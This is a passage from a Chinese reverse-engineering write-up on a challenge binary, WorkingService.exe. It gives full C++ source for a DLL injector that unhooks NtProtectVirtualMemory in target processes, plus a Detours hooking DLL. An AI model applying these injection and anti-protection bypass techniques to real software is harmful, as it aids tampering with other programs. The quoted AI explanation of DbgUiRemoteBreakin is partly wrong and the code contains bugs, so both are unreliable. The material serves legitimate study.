96);">"WorkingService.exe"</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (!ve.empty())        {<br />            printf(<span style="color: rgb(168, 255, 96);">"There are currently %d processes\n"</span>, ve.size());<br />            <span style="color: rgb(146, 255, 184);">//依次注入并用map标记是否被注入过</span><br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">auto</span> i : ve)            {<br />                <span style="color: rgb(150, 203, 254);">auto</span> it = mp.find(i);<br />                <span style="color: rgb(150, 203, 254);">if</span> (it == mp.end())<span style="color: rgb(146, 255, 184);">//没有被注入过</span>                {                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, i);<br />                    <span style="color: rgb(150, 203, 254);">if</span> (InjectDll(hProcess, dllPath))                    {                        Num++;<br />                        mp.insert({ i,<span style="color: rgb(198, 197, 254);">true</span> });<br />                        printf(<span style="color: rgb(168, 255, 96);">"Inject  process Success!\n"</span>, Num);                    }                }<br />                <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(146, 255, 184);">//曾经注入过该进程</span>                {<br />                    printf(<span style="color: rgb(168, 255, 96);">"[%d] Has Been Injected\n"</span>,i);<br />                    <span style="color: rgb(150, 203, 254);">continue</span>;                }            }        }<br />        <span style="color: rgb(150, 203, 254);">else</span>        {<br />            printf(<span style="color: rgb(168, 255, 96);">"Wating WorkingService.exe ...\n"</span>);        }<br />        system(<span style="color: rgb(168, 255, 96);">"cls"</span>);<br />        <span style="color: rgb(146, 255, 184);">//Sleep(200);</span>    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>这里使用Vector去接受所有WorkingService.exe进程的pid，然后用Map去映射一个bool值来判断是否这个进程被注入过，程序运行起来发现CPU能耗还是100%,但是程序告诉我注入成功。???疑惑住了</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=fd85e914&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBFfmUeskd3JAL1VSwdNbKy7EpBfuMhWEDlE8tvpseGLPBt1T7McGmsg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="740" /></p><p><br /></p><p>因为之前注入的时候可以成功降低CPU能耗的，我很确信我的dll是没问题的，所以问题可能就是注入的方式了。考虑到之前注入使用工具注入，在进程启动的同时注入dll，而现在注入是在程序完全跑起来之后，所以怀疑是被下了钩子破坏了注入。在ARK工具里扫一下钩子看一眼。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=5bbf1717&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBeLtiahPCyxzToBIftyTia2ibm4R2SyRdyQwWmFOkNPuEogAcNMpEhvxicQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="817" /></p><p><br /></p><p>豁然开朗！第一个钩子勾住了NtProtectVirtualMemory函数，而我们注入模块的时候就会调用这个内核函数去修改内存权限，第二个钩子勾住了DbgUiRemoteBreakin函数，我也不知道这个函数是干什么的，问一下GPT得知</p><p><code style="font-family: SFMono-Regular, Consolas, ;">DbgUiRemoteBreakin</code>函数是一个Windows API函数，它的作用是向指定的进程发送一个远程调试器的断点请求。当这个函数被调用时，目标进程会触发一个断点异常（通常是访问违规异常），如果目标进程已经有一个调试器附加，那么调试器就会捕获这个异常并进行处理。</p><p>这个函数通常用于以下情况：</p><ol><li style="margin-left: 2px;"><p><span style="font-weight: 700;">附加调试器</span>：如果你想要附加一个调试器到一个正在运行的进程，你可以调用<code style="font-family: SFMono-Regular, Consolas, ;">DbgUiRemoteBreakin</code>来使进程触发断点，然后使用调试器来附加到该进程。</p></li><li style="margin-left: 2px;"><p><span style="font-weight: 700;">检测调试</span>：如果一个进程检测到自己被调试，它可以调用<code style="font-family: SFMono-Regular, Consolas, ;">DbgUiRemoteBreakin</code>来尝试断开任何远程调试器的连接。</p></li></ol><p>看来是能附加调试的，勾住这个来反调试，哇哦，不错的方式。但是我们就先不管它了，先成功注入dll再说。所以现在看来还得先还原NtProtectVirtualMemory函数取消钩子，再调用注入函数，修改一下代码跑一下发现日志文件不能循环写入，应该是线程都退出之后，进程并未停止，猜测是线程函数里有计数的东西，到某个值之后会通知进程结束，从而让守护进程再生工作进程，于是我改了一下hook代码，让线程终止16次后终止进程，从而实现日志文件循环再生。</p><p>效果图：</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=05259c2c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBDkBibv6JgFSOpP2q93jXXGXvdUNXSYIIxPzZdvYLlfgI25oSIcJdtibQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="673" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=8ae86356&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBlicxLOhv1sORYnuGJQl3x0Wuktib25xBxrgHSI4bic7URqJVR0v7uCb1A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><span></span></p><p><br /></p><p>题目二的结果应该就是这样了，能保持写入日志文件功能的同时不破坏工作进程循环启动的机制，大功告成！！！</p><p>附一份exe源码和一份dll源码</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">//main.cpp</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;windows.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;tlhelp32.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;vector&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;map&gt;</span></span><br /><span style="color: rgb(255, 255, 182);">char</span> dllPath[] = <span style="color: rgb(168, 255, 96);">R"(C:\Users\15386\Desktop\temp\hookDll.dll)"</span>;std::vector&lt;DWORD64&gt;ve;<br />std::map&lt;DWORD64, <span style="color: rgb(255, 255, 182);">bool</span>&gt;mp;BYTE jmpBytes[] = {<br /><span style="color: rgb(255, 115, 253);">0xE9</span>, <span style="color: rgb(255, 115, 253);">0xE0</span>, <span style="color: rgb(255, 115, 253);">0x26</span>, <span style="color: rgb(255, 115, 253);">0x16</span>, <span style="color: rgb(255, 115, 253);">0x00</span>};BYTE originBytes[] = {<br /><span style="color: rgb(255, 115, 253);">0x4C</span>, <span style="color: rgb(255, 115, 253);">0x8B</span>, <span style="color: rgb(255, 115, 253);">0xD1</span>, <span style="color: rgb(255, 115, 253);">0xB8</span>, <span style="color: rgb(255, 115, 253);">0x50</span>, <span style="color: rgb(255, 115, 253);">0x00</span>, <span style="color: rgb(255, 115, 253);">0x00</span>, <span style="color: rgb(255, 115, 253);">0x00</span>, <span style="color: rgb(255, 115, 253);">0xF6</span>, <span style="color: rgb(255, 115, 253);">0x04</span>, <span style="color: rgb(255, 115, 253);">0x25</span>, <span style="color: rgb(255, 115, 253);">0x08</span>, <span style="color: rgb(255, 115, 253);">0x03</span>, <span style="color: rgb(255, 115, 253);">0xFE</span>, <span style="color: rgb(255, 115, 253);">0x7F</span>, <span style="color: rgb(255, 115, 253);">0x01</span>,<br /> <span style="color: rgb(255, 115, 253);">0x75</span>, <span style="color: rgb(255, 115, 253);">0x03</span>, <span style="color: rgb(255, 115, 253);">0x0F</span>, <span style="color: rgb(255, 115, 253);">0x05</span>, <span style="color: rgb(255, 115, 253);">0xC3</span>, <span style="color: rgb(255, 115, 253);">0xCD</span>, <span style="color: rgb(255, 115, 253);">0x2E</span>, <span style="color: rgb(255, 115, 253);">0xC3</span>};<br />std::vector&lt;DWORD64&gt; <span style="color: rgb(255, 255, 182);">GetPidByProcName</span>(<span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span>* processName) {    HANDLE hProcessSnap = INVALID_HANDLE_VALUE;<br />    PROCESSENTRY32 pe32 = { <span style="color: rgb(255, 115, 253);">0</span> };    std::vector&lt;DWORD64&gt; vec;    vec.clear();<br />    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color: rgb(255, 115, 253);">0</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (hProcessSnap == INVALID_HANDLE_VALUE) {        vec;    }    pe32.dwSize = sizeof(PROCESSENTRY32);<br />    <span style="color: rgb(150, 203, 254);">if</span> (Process32First(hProcessSnap, &amp;pe32)) {<br />        <span style="color: rgb(150, 203, 254);">do</span> {<br />            <span style="color: rgb(150, 203, 254);">if</span> (strcmp(pe32.szExeFile, processName) == <span style="color: rgb(255, 115, 253);">0</span>) {                vec.push_back(pe32.th32ProcessID);            }<br />        } <span style="color: rgb(150, 203, 254);">while</span> (Process32Next(hProcessSnap, &amp;pe32));    }    CloseHandle(hProcessSnap);<br />    <span style="color: rgb(150, 203, 254);">return</span> vec;}<br />DWORD64 <span style="color: rgb(255, 255, 182);">GetModuleBase</span>(DWORD64 pid,<span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span>* ModuleName){    HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);<br />    <span style="color: rgb(150, 203, 254);">if</span> (hModuleSnap != INVALID_HANDLE_VALUE) {        MODULEENTRY32 me32;        me32.dwSize = sizeof(MODULEENTRY32);<br />        <span style="color: rgb(150, 203, 254);">if</span> (Module32First(hModuleSnap, &amp;me32)) {<br />            <span style="color: rgb(150, 203, 254);">do</span> {<br />                <span style="color: rgb(150, 203, 254);">if</span> (_stricmp(me32.szModule, ModuleName) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />                    <span style="color: rgb(150, 203, 254);">return</span> (DWORD64)me32.modBaseAddr;                }<br />            } <span style="color: rgb(150, 203, 254);">while</span> (Module32Next(hModuleSnap, &amp;me32));        }        CloseHandle(hModuleSnap);    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;}<br />BOOL <span style="color: rgb(255, 255, 182);">InjectDll</span>(HANDLE hProcess, LPCSTR dllPath) {<br />    LPVOID pRemoteDllPath = VirtualAllocEx(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, strlen(dllPath) + <span style="color: rgb(255, 115, 253);">1</span>, MEM_COMMIT, PAGE_READWRITE);<br />    <span style="color: rgb(150, 203, 254);">if</span> (pRemoteDllPath == <span style="color: rgb(198, 197, 254);">NULL</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"VirtualAllocEx Failed:[%d]\n"</span>, GetLastError());<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, strlen(dllPath) + <span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(198, 197, 254);">NULL</span>)) {<br />        printf(<span style="color: rgb(168, 255, 96);">"WriteProcessMemory Failed:[%d]\n"</span>, GetLastError());<br />        VirtualFreeEx(hProcess, pRemoteDllPath, <span style="color: rgb(255, 115, 253);">0</span>, MEM_RELEASE);<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;    }<br />    LPTHREAD_START_ROUTINE lpLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(<span style="color: rgb(168, 255, 96);">"kernel32.dll"</span>), <span style="color: rgb(168, 255, 96);">"LoadLibraryA"</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (lpLoadLibrary == <span style="color: rgb(198, 197, 254);">NULL</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"GetProcAddress Failed:[%d]\n"</span>, GetLastError());<br />        VirtualFreeEx(hProcess, pRemoteDllPath, <span style="color: rgb(255, 115, 253);">0</span>, MEM_RELEASE);<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;    }<br />    HANDLE hThread = CreateRemoteThread(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(255, 115, 253);">0</span>, lpLoadLibrary, pRemoteDllPath, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(198, 197, 254);">NULL</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (hThread == <span style="color: rgb(198, 197, 254);">NULL</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"CreateRemoteThread Failed:[%d]\n"</span>, GetLastError());<br />        VirtualFreeEx(hProcess, pRemoteDllPath, <span style="color: rgb(255, 115, 253);">0</span>, MEM_RELEASE);<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;    }    WaitForSingleObject(hThread, INFINITE);    DWORD dwExitCode;<br />    <span style="color: rgb(150, 203, 254);">if</span> (GetExitCodeThread(hThread, &amp;dwExitCode) &amp;&amp; dwExitCode == <span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"LoadLibraryA Failed in remote process\n"</span>);        CloseHandle(hThread);<br />        VirtualFreeEx(hProcess, pRemoteDllPath, <span style="color: rgb(255, 115, 253);">0</span>, MEM_RELEASE);<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;    }    CloseHandle(hThread);<br />    VirtualFreeEx(hProcess, pRemoteDllPath, <span style="color: rgb(255, 115, 253);">0</span>, MEM_RELEASE);<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;}<br />BOOL <span style="color: rgb(255, 255, 182);">RemoveHook</span>(HANDLE hProcess,PVOID unHookAddr, BYTE* originBytes){<br />   PDWORD oldProtect = <span style="color: rgb(255, 115, 253);">0</span>; <br />   <span style="color: rgb(150, 203, 254);">if</span> (!WriteProcessMemory(hProcess, (PVOID)unHookAddr, originBytes, sizeof(originBytes), <span style="color: rgb(255, 115, 253);">0</span>))   { <br />       printf(<span style="color: rgb(168, 255, 96);">"RemoveHook Failed!!!: [%d]\n"</span>, GetLastError());<br />       <span style="color: rgb(150, 203, 254);">return</span> FALSE;   }}<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />    <span style="color: rgb(150, 203, 254);">while</span> (<span style="color: rgb(255, 115, 253);">1</span>)    {<br />        <span style="color: rgb(255, 255, 182);">int</span> Num = <span style="color: rgb(255, 115, 253);">0</span>;<br />        ve  = GetPidByProcName(<span style="color: rgb(168, 255, 96);">"WorkingService.exe"</span>);<span style="color: rgb(146, 255, 184);">//获取所有进程pid</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (!ve.empty())        {<br />            printf(<span style="color: rgb(168, 255, 96);">"There are currently %d processes\n"</span>, ve.size());<br />            <span style="color: rgb(146, 255, 184);">//依次注入并用map标记是否被注入过</span><br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">auto</span> i : ve)            {<br />                <span style="color: rgb(150, 203, 254);">auto</span> it = mp.find(i);<br />                <span style="color: rgb(150, 203, 254);">if</span> (it == mp.end())<span style="color: rgb(146, 255, 184);">//没有被注入过</span>                {<br />                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, i);<span style="color: rgb(146, 255, 184);">//要用管理员权限运行，要不然为返回空</span><br />                    <span style="color: rgb(150, 203, 254);">if</span> (!hProcess) printf(<span style="color: rgb(168, 255, 96);">"OpenProcess Error:[%d]"</span>, GetLastError());<br />                    DWORD64 unHookAddr = GetModuleBase(i,<span style="color: rgb(168, 255, 96);">"ntdll.dll"</span>) + <span style="color: rgb(255, 115, 253);">0xA0990</span>;<span style="color: rgb(146, 255, 184);">//NtProtectVirtualMemory地址，ntdll + 0xA0990</span><br />                    <span style="color: rgb(150, 203, 254);">if</span> (RemoveHook(hProcess, (PVOID)unHookAddr, originBytes))<span style="color: rgb(146, 255, 184);">//先取消NtProtectVirtualMemory钩子再注入</span>                    {<br />                        <span style="color: rgb(150, 203, 254);">if</span> (InjectDll(hProcess, dllPath))                        {                            Num++;<br />                            mp.insert({ i,<span style="color: rgb(198, 197, 254);">true</span> });<span style="color: rgb(146, 255, 184);">//注入成功后进行标记</span><br />                            printf(<span style="color: rgb(168, 255, 96);">"Inject  process Success!\n"</span>, Num);                        }                    }                }<br />                <span style="color: rgb(150, 203, 254);">else</span>  <span style="color: rgb(150, 203, 254);">continue</span>;<span style="color: rgb(146, 255, 184);">//曾经注入过该进程</span>            }        }<br />        <span style="color: rgb(150, 203, 254);">else</span> printf(<span style="color: rgb(168, 255, 96);">"Wating WorkingService.exe ...\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">1000</span>);<br />        system(<span style="color: rgb(168, 255, 96);">"cls"</span>);    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;}<br /></code></pre><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">//dllmain.cpp</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;windows.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;shellapi.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;detours.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;tlhelp32.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">pragma</span> comment(lib,<span style="color: rgb(168, 255, 96);">"detours.lib"</span>)</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> _KDEBUG</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> DBGMGEBOX(fmt, ...) \    do { \         /* 假设最大长度为1024，根据需要调整大小 */ \        wsprintfA(out, fmt, __VA_ARGS__); \<br />        MessageBoxA(NULL, out, <span style="color: rgb(168, 255, 96);">"提示"</span>, MB_OK); \<br />    } while(0)</span><br /><span style="color: rgb(255, 255, 182);">char</span> out[<span style="color: rgb(255, 115, 253);">100</span>];<br />DWORD tlsIndex;<span style="color: rgb(146, 255, 184);">//tls索引</span><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">BOOL</span>(WINAPI* ShellExecuteExA_t)(SHELLEXECUTEINFOA*);<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">HANDLE</span> (WINAPI* CreateFileA_t)(    LPCSTR                lpFileName,    DWORD                 dwDesiredAccess,    DWORD                 dwShareMode,    LPSECURITY_ATTRIBUTES lpSecurityAttributes,    DWORD                 dwCreationDisposition,    DWORD                 dwFlagsAndAttributes,    HANDLE                hTemplateFile);<br />ShellExecuteExA_t TrueShellExecuteExA = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />CreateFileA_t TrueCreateFileA = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />BOOL WINAPI <span style="color: rgb(255, 255, 182);">HookedShellExecuteExA</span>(SHELLEXECUTEINFOA* pExecInfo) {<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">if</span> 1</span><br />    <span style="color: rgb(146, 255, 184);">//执行第一个ShellExecuteExA守护进程</span><br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> Num = <span style="color: rgb(255, 115, 253);">0</span>;<br />    DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"ShellExecuteExA 被调用:Num = %d\nhProcess = %p"</span>, Num, pExecInfo-&gt;hProcess);<br />    <span style="color: rgb(150, 203, 254);">if</span> (Num == <span style="color: rgb(255, 115, 253);">0</span>)    {        Num++;<br />        <span style="color: rgb(150, 203, 254);">return</span> TrueShellExecuteExA(pExecInfo);    }<br />    <span style="color: rgb(150, 203, 254);">else</span>    {<br />        <span style="color: rgb(150, 203, 254);">return</span> TrueShellExecuteExA(pExecInfo);    }<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">else</span></span><br />    <span style="color: rgb(146, 255, 184);">//执行第二个ShellExecuteExA病毒进程</span><br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> Num = <span style="color: rgb(255, 115, 253);">0</span>;<br />    DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"ShellExecuteExA 被调用:Num = %d \n调用者窗口句柄 = 0x%p\n"</span>, Num, pExecInfo-&gt;hwnd);<br />    <span style="color: rgb(150, 203, 254);">if</span> (Num == <span style="color: rgb(255, 115, 253);">0</span>)    {        Num++;<br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"[2]:当前线程ID：%d"</span>, GetCurrentThreadId());<br />        pExecInfo-&gt;lpFile = <span style="color: rgb(168, 255, 96);">"C:\\Users\\Administrator\\Desktop\\自动F8直到call.txt"</span>;<span style="color: rgb(146, 255, 184);">//修改参数导致重启失败;</span><br />        <span style="color: rgb(150, 203, 254);">return</span> TrueShellExecuteExA(pExecInfo);    }<br />    <span style="color: rgb(150, 203, 254);">else</span>    {<br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"[1]:当前线程ID：%d"</span>, GetCurrentThreadId());<br />        <span style="color: rgb(150, 203, 254);">return</span> TrueShellExecuteExA(pExecInfo);    }<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">endif</span></span>}<br />HANDLE WINAPI <span style="color: rgb(255, 255, 182);">HookCreateFileA</span>(    LPCSTR                lpFileName,    DWORD                 dwDesiredAccess,    DWORD                 dwShareMode,    LPSECURITY_ATTRIBUTES lpSecurityAttributes,    DWORD                 dwCreationDisposition,    DWORD                 dwFlagsAndAttributes,    HANDLE                hTemplateFile){<br />    <span style="color: rgb(146, 255, 184);">//判断线程是否是第一次运行CreateFileA，是的话就放行，不是第一次运行就终止线程</span><br />    <span style="color: rgb(146, 255, 184);">// 获取当前线程的TLS值</span>    LPVOID tlsValue = TlsGetValue(tlsIndex);<br />    <span style="color: rgb(150, 203, 254);">if</span> ((DWORD_PTR)tlsValue &lt;= <span style="color: rgb(255, 115, 253);">0x10</span>)    {<br />        <span style="color: rgb(146, 255, 184);">// </span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">ifdef</span> _KDEBUG</span><br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"放行\nlpFileName:%s\n"</span>, lpFileName);<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">endif</span> </span>        dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;<br />        TlsSetValue(tlsIndex, (LPVOID)((DWORD_PTR)tlsValue + <span style="color: rgb(255, 115, 253);">1</span>));    }<br />    <span style="color: rgb(150, 203, 254);">else</span>    {<br />        <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> Num = <span style="color: rgb(255, 115, 253);">0</span>;<span style="color: rgb(146, 255, 184);">//如果终止了十六个线程，再终止进程，使得守护线程再生工作进程</span><br />        <span style="color: rgb(146, 255, 184);">// 不是第一次运行，终止线程</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">ifdef</span> _KDEBUG</span><br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"终止\nlpFileName:%s\n"</span>, lpFileName);<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">endif</span> </span>        Num++;<br />        ExitThread(<span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (Num == <span style="color: rgb(255, 115, 253);">16</span>) exit(<span style="color: rgb(255, 115, 253);">0</span>);    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TrueCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);}<br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call) {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:        DetourTransactionBegin();        DetourUpdateThread(GetCurrentThread());<br />        <span style="color: rgb(146, 255, 184);">//ShellExecuteExA hook</span><br />        <span style="color: rgb(146, 255, 184);">/*TrueShellExecuteExA = (ShellExecuteExA_t)DetourFindFunction("shell32.dll", "ShellExecuteExA");<br />        DetourAttach(&amp;(PVOID&amp;)TrueShellExecuteExA, HookedShellExecuteExA);*/</span><br />        tlsIndex = TlsAlloc();<span style="color: rgb(146, 255, 184);">//初始化TLS</span><br />        TrueCreateFileA = (CreateFileA_t)DetourFindFunction(<span style="color: rgb(168, 255, 96);">"kernelbase.dll"</span>, <span style="color: rgb(168, 255, 96);">"CreateFileA"</span>);        DetourAttach(&amp;(PVOID&amp;)TrueCreateFileA, HookCreateFileA);        DetourTransactionCommit();<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:        DetourTransactionBegin();        DetourUpdateThread(GetCurrentThread());        DetourDetach(&amp;(PVOID&amp;)TrueShellExecuteExA, HookedShellExecuteExA);        DetourDetach(&amp;(PVOID&amp;)TrueCreateFileA, HookCreateFileA);<br />        TlsFree(tlsIndex);<span style="color: rgb(146, 255, 184);">//清理TLS</span>        DetourTransactionCommit();<br />        <span style="color: rgb(150, 203, 254);">break</span>;    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;}<br /></code></pre><p>接着是第三题，要求是<span style="font-weight: 700;">WorkingService.exe的主体功能为写入信息。在没有源码的情况下提取这个部分，自行编写一个性能更佳的服务，完全替代WorkingService.exe写入同样的密文信息，且运行时平均占用CPU时间低于5%。（2分）</span></p><p>根据之前分析，现在一直的程序功能主要体现在，创建守护进程启动-&gt;启动工作进程-&gt;创建十六个线程-&gt;每个线程创建一个日志文件-&gt;向文件写入密文-&gt;进程退出-&gt;守护进程循环创建工作进程，大致功能应该就是这些，而现在要解决的问题就是日志文件名和日志密文是怎么产生的。</p><p>在WriteFile下个断点看一眼密文的大致模样。</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=615dbde0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYB2RyNrz7xy5PChqXUS1O6VwjU7DKib0UvicKT1x2GCzPDRxjk9QkzRWCA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>猜测有可能是base64加密，因为之前查看字符串有看到base64的码表，还是一个魔改码表，直接丢cyberchef试一下解密</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=2927bd44&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBiawL4YlljUiav82dkPaln2HibJ7e63KvibMbfCbDmwSGbPV8zCEsEHhqqQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><img border="0" 